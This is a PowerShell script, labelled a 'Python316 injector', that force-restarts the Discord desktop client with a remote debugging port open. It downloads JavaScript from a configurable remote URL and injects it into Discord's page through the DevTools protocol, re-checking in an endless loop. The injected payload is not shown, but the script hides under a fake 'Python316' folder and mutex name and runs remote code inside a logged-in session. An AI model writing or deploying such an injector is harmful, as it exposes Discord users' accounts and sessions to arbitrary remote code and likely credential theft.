[CmdletBinding()]
param(
    [int]$Port,
    [string]$Root,
    [string]$RepoBase,
    [string]$MainUrl,
    [string]$MainPath,
    [switch]$Once,
    [switch]$NoRestart,
    [switch]$NoLaunch,
    [switch]$NoDownload,
    [switch]$Quiet
)

$ErrorActionPreference = 'Stop'

# $PSScriptRoot is empty inside param defaults when launched with -File.
if (-not $Root) {
    $Root = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
}

# ---------------------------------------------------------------- state / log
$StateDir = Join-Path $env:LOCALAPPDATA 'Python316'
if (-not (Test-Path $StateDir)) { New-Item -ItemType Directory -Path $StateDir -Force | Out-Null }
$LogFile      = Join-Path $StateDir 'injector.log'
$RestartStamp = Join-Path $StateDir 'last_restart.txt'
$StateFile    = Join-Path $StateDir 'last_inject.json'

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = '{0} [{1}] {2}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    if (-not $Quiet) { Write-Host $line }
    try {
        if ((Test-Path $LogFile) -and ((Get-Item $LogFile).Length -gt 1048576)) {
            Move-Item $LogFile "$LogFile.old" -Force
        }
        Add-Content -Path $LogFile -Value $line -Encoding UTF8
    } catch {}
}

# ---------------------------------------------------------------- config
$cfg = [pscustomobject]@{}
$configPath = Join-Path $Root 'config.json'
if (Test-Path $configPath) {
    try { $cfg = Get-Content $configPath -Raw | ConvertFrom-Json } catch { Write-Log 'config.json parse failed' 'WARN' }
}
if (-not $PSBoundParameters.ContainsKey('Port') -and $cfg.port) { $Port = [int]$cfg.port }
if (-not $Port) { $Port = 9222 }
if (-not $MainUrl -and $cfg.githubRaw) { $MainUrl = [string]$cfg.githubRaw }
if (-not $RepoBase -and $cfg.repoBase) { $RepoBase = [string]$cfg.repoBase }
if (-not $MainPath) { $MainPath = Join-Path $Root 'main.js' }
$AutoLaunch      = if ($null -ne $cfg.autoLaunch)      { [bool]$cfg.autoLaunch }      else { $true }
$RestartExisting = if ($null -ne $cfg.restartExisting) { [bool]$cfg.restartExisting } else { $true }
$PollSeconds     = if ($cfg.pollSeconds)               { [int]$cfg.pollSeconds }      else { 6 }

function Get-RepoBase {
    if ($RepoBase) { return $RepoBase.TrimEnd('/') }
    if ($MainUrl) { return ($MainUrl -replace '/[^/]+$', '').TrimEnd('/') }
    return $null
}
$RepoBase = Get-RepoBase

# ---------------------------------------------------------------- single instance
$mutex = New-Object System.Threading.Mutex($false, 'Local\Python316Injector')
$hasMutex = $false
try { $hasMutex = $mutex.WaitOne(0) } catch { $hasMutex = $true }
if (-not $hasMutex) {
    Write-Log 'Another injector is already running. Exit.' 'WARN'
    exit 0
}

# ---------------------------------------------------------------- helpers
function Get-DiscordExe {
    $base = Join-Path $env:LOCALAPPDATA 'Discord'
    if (-not (Test-Path $base)) { return $null }
    $apps = Get-ChildItem -LiteralPath $base -Directory -Filter 'app-*' -ErrorAction SilentlyContinue |
        Sort-Object { try { [version]($_.Name -replace '^app-', '') } catch { [version]'0.0.0' } } -Descending
    foreach ($a in $apps) {
        $exe = Join-Path $a.FullName 'Discord.exe'
        if (Test-Path $exe) { return $exe }
    }
    $stub = Join-Path $base 'Discord.exe'
    if (Test-Path $stub) { return $stub }
    return $null
}

function Test-DebugEndpoint {
    try {
        return (Invoke-RestMethod -Uri ("http://127.0.0.1:{0}/json" -f $Port) -TimeoutSec 3 -UseBasicParsing)
    } catch { return $null }
}

function Wait-DebugEndpoint {
    param([int]$Seconds = 30)
    $deadline = (Get-Date).AddSeconds($Seconds)
    while ((Get-Date) -lt $deadline) {
        $t = Test-DebugEndpoint
        if ($t) { return $t }
        Start-Sleep -Milliseconds 700
    }
    return $null
}

function Restart-Allowed {
    if (-not (Test-Path $RestartStamp)) { return $true }
    try {
        $last = [datetime]::Parse((Get-Content $RestartStamp -Raw).Trim())
        return ((Get-Date) - $last).TotalSeconds -gt 90
    } catch { return $true }
}

function Invoke-CdpEval {
    param([Parameter(Mandatory = $true)][string]$Code)

    $targets = Invoke-RestMethod -Uri ("http://127.0.0.1:{0}/json" -f $Port) -TimeoutSec 5 -UseBasicParsing
    $pages = @($targets | Where-Object { $_.type -eq 'page' -and $_.webSocketDebuggerUrl })
    $page = $pages | Where-Object {
        ($_.url -and $_.url -match 'discord') -or ($_.title -and $_.title -match 'Discord')
    } | Select-Object -First 1
    if (-not $page) { $page = $pages | Select-Object -First 1 }
    if (-not $page) { throw 'No injectable page target found' }

    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ct = [System.Threading.CancellationToken]::None
    [void]$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).GetAwaiter().GetResult()

    try {
        $payload = @{
            id     = 1
            method = 'Runtime.evaluate'
            params = @{
                expression    = $Code
                awaitPromise  = $true
                returnByValue = $true
                userGesture   = $true
            }
        } | ConvertTo-Json -Depth 8 -Compress

        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $seg = New-Object 'System.ArraySegment[byte]' -ArgumentList @(,$bytes)
        [void]$ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).GetAwaiter().GetResult()

        $ms = New-Object System.IO.MemoryStream
        $buf = New-Object byte[] 32768
        while ($true) {
            $segR = New-Object 'System.ArraySegment[byte]' -ArgumentList @(,$buf)
            $res = $ws.ReceiveAsync($segR, $ct).GetAwaiter().GetResult()
            if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { break }
            if ($res.Count -gt 0) { $ms.Write($buf, 0, $res.Count) }
            if ($res.EndOfMessage) { break }
        }
        return [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
    } finally {
        try {
            [void]$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, 'done', $ct).GetAwaiter().GetResult()
        } catch {}
        try { $ws.Dispose() } catch {}
    }
}

function Get-EvalValue {
    param([string]$Text)
    try {
        $o = $Text | ConvertFrom-Json
        if ($o.exceptionDetails) { return $null }
        if ($null -ne $o.result -and $null -ne $o.result.result) { return $o.result.result.value }
        return $null
    } catch { return $null }
}

function Get-CurrentVersion {
    try {
        $r = Invoke-CdpEval -Code "try{(window.__python316 && window.__python316.__version) || null}catch(e){null}"
        return Get-EvalValue -Text $r
    } catch { return $null }
}

function Test-VersionMatch {
    param($Current, [string]$Desired)
    if (-not $Desired) { return [bool]$Current }
    return ([string]$Current -eq [string]$Desired)
}

function Test-PayloadCode {
    param([string]$Code)
    if (-not $Code -or $Code.Length -lt 500) { return $false }
    if ($Code -notmatch '__python316') { return $false }
    if ($Code -notmatch 'Python3\.16') { return $false }
    return $true
}

function Save-PayloadCache {
    param([string]$Code)
    try {
        $tmp = "$MainPath.tmp"
        Set-Content -LiteralPath $tmp -Value $Code -Encoding UTF8
        Move-Item -LiteralPath $tmp -Destination $MainPath -Force
    } catch { Write-Log "Cache write failed: $($_.Exception.Message)" 'WARN' }
}

function Get-RemotePayload {
    # returns @{ Code; Version; Url } or $null
    if ($NoDownload) { return $null }
    $url = $MainUrl
    $version = $null

    if ($RepoBase) {
        try {
            $vUrl = '{0}/version.json?t={1}' -f $RepoBase, [DateTime]::UtcNow.Ticks
            $v = Invoke-RestMethod -Uri $vUrl -TimeoutSec 10 -UseBasicParsing
            if ($v.url) { $url = [string]$v.url }
            if ($v.version) { $version = [string]$v.version }
        } catch {
            Write-Log "version.json unavailable: $($_.Exception.Message)" 'WARN'
        }
    }
    if (-not $url) { Write-Log 'No payload URL resolved' 'WARN'; return $null }

    try {
        $sep = if ($url -match '\?') { '&' } else { '?' }
        $fUrl = '{0}{1}t={2}' -f $url, $sep, [DateTime]::UtcNow.Ticks
        $code = (Invoke-WebRequest -Uri $fUrl -UseBasicParsing -TimeoutSec 20).Content
        if (-not (Test-PayloadCode -Code $code)) { throw 'payload failed validation' }
        if ($version -and $code -match '__version\s*=\s*[''"]([^''"]+)[''"]') {
            $codeVer = $Matches[1]
            if ($codeVer -ne $version) { Write-Log "version.json=$version but payload=$codeVer" 'WARN' }
            $version = $codeVer
        }
        Save-PayloadCache -Code $code
        return [pscustomobject]@{ Code = $code; Version = $version; Url = $url }
    } catch {
        Write-Log "Download failed: $($_.Exception.Message)" 'WARN'
        return $null
    }
}

function Get-LocalPayload {
    if (-not (Test-Path $MainPath)) { return $null }
    $code = Get-Content -LiteralPath $MainPath -Raw
    if (-not (Test-PayloadCode -Code $code)) { return $null }
    $version = $null
    if ($code -match '__version\s*=\s*[''"]([^''"]+)[''"]') { $version = $Matches[1] }
    return [pscustomobject]@{ Code = $code; Version = $version; Url = $MainPath }
}

function Get-Payload {
    $p = Get-RemotePayload
    if ($p) { return $p }
    $p = Get-LocalPayload
    if ($p) {
        Write-Log "Using local payload: $MainPath"
        return $p
    }
    throw 'No payload available (download failed and no valid local main.js)'
}

function Restart-Discord {
    param([string]$Exe)
    if (-not $Exe) { throw 'Discord executable not found' }
    Write-Log 'Restarting Discord to enable the debug port'
    Get-Process -Name Discord -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2
    Start-Process -FilePath $Exe -ArgumentList ("--remote-debugging-port={0}" -f $Port) | Out-Null
    Set-Content -LiteralPath $RestartStamp -Value (Get-Date -Format 'o') -Encoding Ascii
}

function Save-InjectState {
    param([string]$Version)
    try {
        [pscustomobject]@{
            version = $Version
            time    = (Get-Date -Format 'o')
            port    = $Port
        } | ConvertTo-Json | Set-Content -LiteralPath $StateFile -Encoding UTF8
    } catch {}
}

$script:FailBackoff = 0
$script:LastOkVersion = $null

# ---------------------------------------------------------------- one pass
function Invoke-Pass {
    $proc = Get-Process -Name Discord -ErrorAction SilentlyContinue | Select-Object -First 1
    $exe = if ($proc -and $proc.Path) { $proc.Path } else { Get-DiscordExe }

    if (-not $proc) {
        if ($NoLaunch -or -not $AutoLaunch) {
            Write-Log 'Discord not running (launch disabled)'
            return
        }
        if (-not $exe) { Write-Log 'Discord not installed' 'WARN'; return }
        Write-Log "Discord not running. Launching with debug port $Port"
        Start-Process -FilePath $exe -ArgumentList ("--remote-debugging-port={0}" -f $Port) | Out-Null
        [void](Wait-DebugEndpoint -Seconds 30)
        return
    }

    if (-not (Test-DebugEndpoint)) {
        if ($NoRestart -or -not $RestartExisting) {
            Write-Log 'Discord is running without the debug port (restart disabled)'
            return
        }
        if (-not (Restart-Allowed)) {
            Write-Log 'Waiting before another restart attempt' 'WARN'
            return
        }
        Restart-Discord -Exe $exe
        [void](Wait-DebugEndpoint -Seconds 30)
        return
    }

    try {
        $payload = Get-Payload
        $current = Get-CurrentVersion

        if (Test-VersionMatch -Current $current -Desired $payload.Version) {
            $v = [string]$current
            if ($script:LastOkVersion -ne $v) { Write-Log ("Up to date (v{0})" -f $v) 'DEBUG'; $script:LastOkVersion = $v }
            $script:FailBackoff = 0
            return
        }

        if ($RepoBase) {
            $safeBase = $RepoBase -replace "'", "''"
            [void](Invoke-CdpEval -Code ("window.__py316Repo = '{0}';" -f $safeBase))
        }

        [void](Invoke-CdpEval -Code $payload.Code)
        Start-Sleep -Milliseconds 250
        $after = Get-CurrentVersion

        if ($after) {
            $script:FailBackoff = 0
            $script:LastOkVersion = [string]$after
            Save-InjectState -Version ([string]$after)
            if ($payload.Version -and ([string]$after -ne [string]$payload.Version)) {
                Write-Log ("Injected but version mismatch (current={0} payload={1})" -f $after, $payload.Version) 'WARN'
            } else {
                Write-Log ("main.js injected successfully (v{0})" -f $after) 'OK'
            }
        } else {
            throw 'marker missing after evaluate (page may not be ready)'
        }
    } catch {
        $script:FailBackoff = if ($script:FailBackoff -lt 6) { 6 } else { [Math]::Min(60, $script:FailBackoff * 2) }
        Write-Log ("Injection error: {0} (backoff {1}s)" -f $_.Exception.Message, $script:FailBackoff) 'ERR'
    }
}

# ---------------------------------------------------------------- run
Write-Log ("Python316 injector v2 starting (port={0} root={1} once={2} base={3})" -f $Port, $Root, [bool]$Once, $RepoBase)

try {
    if ($Once) {
        Invoke-Pass
    } else {
        while ($true) {
            try { Invoke-Pass } catch { Write-Log "Pass error: $($_.Exception.Message)" 'ERR' }
            $sleep = [Math]::Max($PollSeconds, $script:FailBackoff)
            Start-Sleep -Seconds $sleep
        }
    }
} finally {
    try { if ($hasMutex) { $mutex.ReleaseMutex() } } catch {}
    try { $mutex.Dispose() } catch {}
}
